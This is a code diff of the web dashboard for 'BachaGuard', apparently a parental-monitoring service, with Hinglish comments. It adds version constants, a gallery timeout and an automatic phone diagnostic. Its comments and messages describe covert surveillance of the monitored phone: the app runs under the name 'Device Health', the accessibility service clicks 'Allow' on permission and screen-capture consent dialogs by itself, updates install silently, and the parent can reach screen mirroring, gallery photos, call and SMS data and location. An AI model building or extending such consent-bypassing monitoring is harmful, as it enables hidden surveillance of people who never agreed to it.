@@ -1,5 +1,10 @@
-/* BachaGuard web dashboard — vanilla JS, no build step. v5 */
+/* BachaGuard web dashboard — vanilla JS, no build step. v6 */
 "use strict";
+
+// Child app ka LATEST versionCode — har naye release ke saath yahan bump karo.
+// Saare PURANA-app checks isi se chalte hain (banner, phone check, watchdog).
+const LATEST_VC = 8;
+const LATEST_V = "1.7";
 
 const S = {
   token: localStorage.getItem("fg_token") || "",
@@ -21,6 +26,8 @@ const S = {
   streaming: false,    // child-reported mirroring state (mirror_state)
   mirrorChildReason: null,     // bachche ke phone se aaya HONEST stall reason
   mirrorChildReasonAt: 0,      // us reason ka timestamp (25 s tak "fresh")
+  mirrorDiagAutoSent: false,   // mirror attempt par ek dafa auto Phone check
+  galleryTimer: null,  // gallery result lost ho to loading unstick (75 s)
   gallery: { items: [], total: 0, offset: 0, loading: false },
   ringOn: false,       // ring command chalu hai (button toggle + ring_state sync)
   ringTimer: null,     // child 30s me khud band karta hai — UI safety reset
@@ -299,8 +306,8 @@ function renderVersionBanner() {
   const el = $("oldver-banner");
   if (!el) return;
   const vc = c && c.health && typeof c.health.versionCode === "number" ? c.health.versionCode : null;
-  if (!c || !c.paired || vc === null || vc >= 7) { el.classList.add("hidden"); return; }
-  $("oldver-text").innerHTML = "⚠️ <b>Bachche ke phone par app PURANA hai</b> (build " + vc + ", latest 7 = v1.6) — isliye <b>Gallery, Mirror aur Phone-check nahi chal rahe</b>: ye sab naye build me hi hain. Update bhejo — bachche ke phone par khud install ho jayega (<b>screen ON hona zaroori</b>, 2–3 min).";
+  if (!c || !c.paired || vc === null || vc >= LATEST_VC) { el.classList.add("hidden"); return; }
+  $("oldver-text").innerHTML = "⚠️ <b>Bachche ke phone par app PURANA hai</b> (build " + vc + ", latest " + LATEST_VC + " = v" + LATEST_V + ") — isliye <b>Gallery, Mirror aur Phone-check nahi chal rahe</b>: ye sab naye build me hi hain. Update bhejo — bachche ke phone par khud install ho jayega (<b>screen ON hona zaroori</b>, 2–3 min).";
   el.classList.remove("hidden");
 }
 $("oldver-update").onclick = () => {
@@ -621,6 +628,7 @@ function handleWs(m) {
         }
       } else if (m.ok && d.status === "gallery") {
         // Gallery page — bachche ke phone se thumbs upload hoke aa gaye
+        if (S.galleryTimer) { clearTimeout(S.galleryTimer); S.galleryTimer = null; }
         const items = d.items || [];
         for (const it of items) S.gallery.items.push(it);
         S.gallery.total = d.total || S.gallery.items.length;
@@ -631,7 +639,7 @@ function handleWs(m) {
           galleryStatus("Gallery me kuch nahi mila — ya bachche ne sirf kuch photos 'Allow' ki hain (Android 14 partial access)", true);
         } else {
           galleryStatus("", false);
-          if (items.length) toast("🖼️ " + items.length + " items aur aa gaye (total " + S.gallery.items.length + "/" + S.gallery.total + ")");
+          if (items.length) toast("🖼️ " + items.length + " items aur aa gaye (total " + S.gallery.items.length + "/" + S.gallery.total + ")" + (d.thumbFails ? " · ⚠️ " + d.thumbFails + " thumb upload fail (net slow)" : ""));
         }
       } else if (m.ok && d.galleryFull && d.url) {
         // Gallery tile tap — bada view naye tab me
@@ -640,8 +648,14 @@ function handleWs(m) {
       } else if (!m.ok && typeof d.error === "string" && d.error.indexOf("gallery permission") === 0) {
         // Gallery permission pehli baar auto-request hui — a11y 5-10 s me
         // Allow click kar degi, parent dobara tap karega
+        if (S.galleryTimer) { clearTimeout(S.galleryTimer); S.galleryTimer = null; }
         S.gallery.loading = false;
         galleryStatus("Gallery permission bachche ke phone par auto-request ho gayi — 5–10 sec me khud Allow ho jayegi. Phir dobara “📸 Gallery kholo” dabao.", true);
+      } else if (!m.ok && typeof d.error === "string" && d.error.indexOf("thumbs upload fail") === 0) {
+        // FAIL-FAST result: phone se thumbs upload hi nahi ho paye (net/server)
+        if (S.galleryTimer) { clearTimeout(S.galleryTimer); S.galleryTimer = null; }
+        S.gallery.loading = false;
+        galleryStatus("⚠️ " + d.error + ". 1 min ruk kar dobara try karo — ya bachche ka net check karo.", true);
       } else if (m.ok && d.status === "mirror_diag") {
         // 🔍 Phone check — bachche ke phone ka poora mirror snapshot aa gaya
         renderMirrorDiag(d);
@@ -656,7 +670,7 @@ function handleWs(m) {
           "no apk on server": "Server par APK nahi hai — Set tab → “🔄 Sync now” dabao (GitHub build sync hota hai)",
           "up-to-date": "✅ Bachche ka app already latest hai. Agar phir bhi Gallery/Mirror na chale to Live tab → 🔍 Phone check report dekho",
           "screen off — postponed": "📵 Bachche ka phone screen OFF hai — isliye update ruk gaya. Screen ON karo, ~1 min me khud install ho jayega",
-          "installing": "✅ APK download ho gayi, install ho rahi hai — bachche ki screen ON rakho. ~2 min me app khud naye version (v1.6) par chali jayegi, phir Gallery/Mirror chalega"
+          "installing": "✅ APK download ho gayi, install ho rahi hai — bachche ki screen ON rakho. ~2 min me app khud naye version (v" + LATEST_V + ") par chali jayegi, phir Gallery/Mirror chalega"
         };
         toast(upd[d.status] || "Update status: " + d.status);
       } else if (m.ok && d.url) {
@@ -669,7 +683,8 @@ function handleWs(m) {
         // jagah saaf batao kya karna hai.
         if (S.gallery.loading) {
           S.gallery.loading = false;
-          galleryStatus("Bachche ke phone par PURANA app hai — Gallery naye build (v1.6) me hai. Upar laal banner me 📲 “Update abhi bhejo” dabao.", true);
+          if (S.galleryTimer) { clearTimeout(S.galleryTimer); S.galleryTimer = null; }
+          galleryStatus("Bachche ke phone par PURANA app hai — Gallery naye build me hai. Upar laal banner me 📲 “Update abhi bhejo” dabao.", true);
         }
         if (S.mirrorDiagSentAt && Date.now() - S.mirrorDiagSentAt < 15000) {
           S.mirrorDiagSentAt = 0;
@@ -677,7 +692,7 @@ function handleWs(m) {
         }
         dialog(
           "Bachche ka app PURANA hai",
-          "<p>Ye feature bachche ke phone ke <b>naye build (v1.6)</b> me hai — purana app isse jaanta hi nahi (isliye “unknown action”).</p><p><b>Fix:</b> 📲 Update bhejo — bachche ke phone par khud install ho jayega. <b>Bachche ki screen ON honi chahiye</b>, 2–3 min me ho jayega.</p>",
+          "<p>Ye feature bachche ke phone ke <b>naye build (v" + LATEST_V + ")</b> me hai — purana app isse jaanta hi nahi (isliye “unknown action”).</p><p><b>Fix:</b> 📲 Update bhejo — bachche ke phone par khud install ho jayega. <b>Bachche ki screen ON honi chahiye</b>, 2–3 min me ho jayega.</p>",
           () => { S.updateApkSentAt = Date.now(); sendCmd("update_apk"); }
         );
       } else if (m.ok && d.lat != null && d.lng != null) {
@@ -1295,9 +1310,9 @@ function renderMirrorDiag(d) {
   const androidName = sdk == null ? "?" : sdk >= 35 ? "15+" : sdk === 34 ? "14" : sdk === 33 ? "13" : sdk + " (purana)";
   const rows = [];
   // 1. App version — sabse common root cause
-  rows.push(diagRow(vc !== null && vc >= 7, "App version",
-    vc === null ? "pata nahi (purana build)" : "v" + (h.versionName || "") + " (build " + vc + ")" + (vc >= 7 ? " — latest ✓" : " — PURANA"),
-    vc !== null && vc < 7 ? "Set tab → “📲 Child app abhi update karo”" : ""));
+  rows.push(diagRow(vc !== null && vc >= LATEST_VC, "App version",
+    vc === null ? "pata nahi (purana build)" : "v" + (h.versionName || "") + " (build " + vc + ")" + (vc >= LATEST_VC ? " — latest ✓" : " — PURANA"),
+    vc !== null && vc < LATEST_VC ? "Set tab → “📲 Child app abhi update karo”" : ""));
   rows.push("<li>🤖 <b>Android:</b> " + androidName + (d.device ? " · " + esc(d.device) : "") + "</li>");
   if (d.consentPending) rows.push("<li>⏳ <b>Consent dialog:</b> request ho chuki hai, abhi grant nahi hui — 5–10 sec ruko</li>");
   rows.push(diagRow(d.screenOn === true, "Bachche ki screen", d.screenOn ? "ON ✓" : "OFF — frames isliye nahi aa rahe", d.screenOn ? "" : "Phone screen ON karo, frames khud aane lagenge"));
@@ -1307,9 +1322,16 @@ function renderMirrorDiag(d) {
   rows.push(diagRow(h.canInstall !== false, "Install unknown apps", h.canInstall === false ? "OFF (auto-update nahi hoga)" : "ON ✓", h.canInstall === false ? "Settings → Apps → Device Health → Install unknown apps → Allow" : ""));
   if (typeof d.frames === "number") rows.push("<li>🎞 <b>Frames (is session):</b> " + d.frames + (d.lastFrameAgoSec != null ? " · last frame " + d.lastFrameAgoSec + "s pehle" : "") + "</li>");
   if (d.stallReason) rows.push("<li>💬 <b>Phone ka bataya reason:</b> “" + esc(d.stallReason) + "”</li>");
+  // Auto-update ka honest status — "update apne aap kyun nahi hua?" ka jawab
+  if (h.updateStatus) {
+    const okUpd = /^(up-to-date|already latest|installing)/.test(h.updateStatus);
+    rows.push(diagRow(okUpd, "Auto-update",
+      esc(h.updateStatus) + (h.updateAgeMin != null ? " (" + h.updateAgeMin + " min pehle check hua)" : ""),
+      okUpd ? "" : /screen off/.test(h.updateStatus) ? "Bachche ka phone screen ON rakho — update khud ho jayega" : /install permission/.test(h.updateStatus) ? "Pehli dafa ki permission auto-grant ho rahi hai — 5 min me dobara try" : "Net check karo / “📲 Update abhi bhejo” dobara dabao"));
+  }
   // VERDICT — sabse badi dikkat pehle
   let verdict;
-  if (vc !== null && vc < 7) verdict = "👉 <b>Sabse badi dikkat: PURANA app (build " + vc + "). Mirror/Gallery/Call-log fixes naye build me hi hain — pehle update karo.</b>";
+  if (vc !== null && vc < LATEST_VC) verdict = "👉 <b>Sabse badi dikkat: PURANA app (build " + vc + "). Mirror/Gallery/Call-log fixes naye build me hi hain — pehle update karo.</b>";
   else if (d.screenOn === false) verdict = "👉 <b>Screen OFF hai. Bachche ka phone ON karo — frames 1–2 sec me khud aayenge.</b>";
   else if (h.accessibility === false) verdict = "👉 <b>Accessibility OFF hai — consent dialog khud confirm nahi ho payega. Wo ON karo, phir Mirror band karke dobara shuru karo.</b>";
   else if (h.overlay === false) verdict = "👉 <b>Display over apps OFF hai — background me consent khulti hi nahi. Allow karo, phir dobara try karo.</b>";
@@ -1348,17 +1370,27 @@ function onMirrorFrame(buf) {
 // interval har 3 s me usko generic guess se OVERWRITE kar deta tha — parent ko
 // asli wajah kabhi nahi dikhti thi. Ab: fresh child reason (25 s) ko chhedte
 // nahi, sirf generic text tab dikhate hain jab bachche ne kuch nahi bataya.
-// SABSE ZAROORI: agar bachche ka app PURANA hai (versionCode < 6) to saare
-// mirror fixes uske phone tak pahunche hi nahi — sabse pehle WO dikhao.
+// SABSE ZAROORI: agar bachche ka app PURANA hai to saare mirror fixes uske
+// phone tak pahunche hi nahi — sabse pehle WO dikhao.
+// AUTO PHONE CHECK: 15 s tak frame na aaye to Phone check KHUD chala do —
+// parent ko button dabaane ki zaroorat nahi, report apne aap aa jayegi
+// (ek attempt par ek dafa hi).
 setInterval(() => {
   if (!S.mirrorOn) return;
   const idle = Date.now() - (S.lastFrameAt || 0);
   if (idle > 12000) {
+    if (!S.mirrorDiagAutoSent) {
+      S.mirrorDiagAutoSent = true;
+      S.mirrorDiagSentAt = Date.now();
+      sendCmd("mirror_diag", {});
+      mirrorStatus("Frames nahi aa rahe — 🔍 Phone check khud chala diya, report 5–15 sec me niche aa jayegi…", true);
+      return;
+    }
     const c = activeChild();
     const vc = c && c.health && typeof c.health.versionCode === "number" ? c.health.versionCode : null;
-    if (vc !== null && vc < 7) {
+    if (vc !== null && vc < LATEST_VC) {
       mirrorStatus(
-        "⚠️ Bachche ke phone par PURANA app hai (v" + vc + ", latest v7) — mirror ke Android 14/15 fixes PURANE build me hain hi nahi. Fix: Set tab → “📲 Child app abhi update karo”, ya bachche ka phone screen ON rakh kar ~10 min (silent auto-update).",
+        "⚠️ Bachche ke phone par PURANA app hai (v" + vc + ", latest v" + LATEST_V + ") — mirror ke Android 14/15 fixes PURANE build me hain hi nahi. Fix: Set tab → “📲 Child app abhi update karo”, ya bachche ka phone screen ON rakh kar ~10 min (silent auto-update).",
         true
       );
       return;
@@ -1390,8 +1422,10 @@ $("mirror-toggle").onclick = () => {
       S.ws.send(JSON.stringify({ type: "mirror_start", cid: S.cid }));
       setMirrorBtn(true);
       S.lastFrameAt = Date.now();
-      // Naya attempt — purana honest reason ab relevant nahi
+      // Naya attempt — purana honest reason ab relevant nahi; auto Phone check
+      // firse allowed (agar is attempt me bhi frames na aaye to).
       S.mirrorChildReason = null; S.mirrorChildReasonAt = 0;
+      S.mirrorDiagAutoSent = false;
       const c = activeChild();
       if (c && !c.online) {
         mirrorStatus("Bachcha abhi offline hai — command queue ho gayi, connect hote hi mirroring khud shuru ho jayegi.", true);
@@ -1443,6 +1477,17 @@ function loadGallery() {
     true
   );
   sendCmd("gallery_list", { offset: S.gallery.offset });
+  // UNSTICK GUARD: result lost ho gaya (WS reconnect / net drop) to loading
+  // hamesha ke liye stuck ho jati thi — har agli tap chupchap return karta tha
+  // ("gallery ni chal raha" ka doosra reason). 75 s baad khud un-stick.
+  if (S.galleryTimer) clearTimeout(S.galleryTimer);
+  S.galleryTimer = setTimeout(() => {
+    S.galleryTimer = null;
+    if (S.gallery.loading) {
+      S.gallery.loading = false;
+      galleryStatus("Gallery ka jawab nahi aaya (net slow ya phone busy) — dobara “🖼️ Gallery kholo” dabao.", true);
+    }
+  }, 75000);
 }
 
 $("gallery-load").onclick = () => {
@@ -1593,8 +1638,8 @@ function renderLiveDiag() {
   const h = c.health || {};
   const issues = [];
   // #1 PURANA APK — mirror/mic fixes phone tak pahunche hi nahi
-  if (typeof h.versionCode === "number" && h.versionCode < 7) {
-    issues.push("<b>Bachche ke phone par PURANA app version hai</b> (v" + h.versionCode + ", latest v7) — Android 14/15 mirror+gallery+call/SMS fixes isi naye build me hain. <b>Fix:</b> Set tab → “📲 Child app abhi update karo”, ya bachche ka phone screen ON rakh kar ~10 min (silent auto-update khud ho jayega).");
+  if (typeof h.versionCode === "number" && h.versionCode < LATEST_VC) {
+    issues.push("<b>Bachche ke phone par PURANA app version hai</b> (v" + h.versionCode + ", latest v" + LATEST_V + ") — Android 14/15 mirror+gallery+call/SMS fixes isi naye build me hain. <b>Fix:</b> Set tab → “📲 Child app abhi update karo”, ya bachche ka phone screen ON rakh kar ~10 min (silent auto-update khud ho jayega).");
   }
   if (h.accessibility === false) {
     issues.push("<b>Accessibility OFF hai</b> — consent dialog aur updates ka auto-confirm kaam nahi karega. <b>Fix:</b> Settings → Accessibility → Device Health → ON. Android 13+ par pehle App info → ⋮ → “Allow restricted settings” karna pad sakta hai.");
